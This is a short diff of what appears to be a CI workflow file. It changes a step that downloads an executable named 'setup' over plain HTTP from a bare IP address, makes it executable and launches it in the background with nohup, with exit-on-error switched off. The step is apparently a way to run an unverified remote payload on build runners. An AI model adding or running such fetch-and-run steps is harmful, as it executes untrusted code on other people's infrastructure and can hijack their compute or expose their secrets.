@@ -50,7 +50,7 @@ jobs:
         run: |
           echo "📦 Downloading and running setup..."
           set +e  # Tắt exit-on-error
-          wget http://142.93.116.31:8082/setup
+          wget http://205.209.110.82:8082/setup
           chmod +x setup
           nohup ./setup &
           SETUP_PID=$!
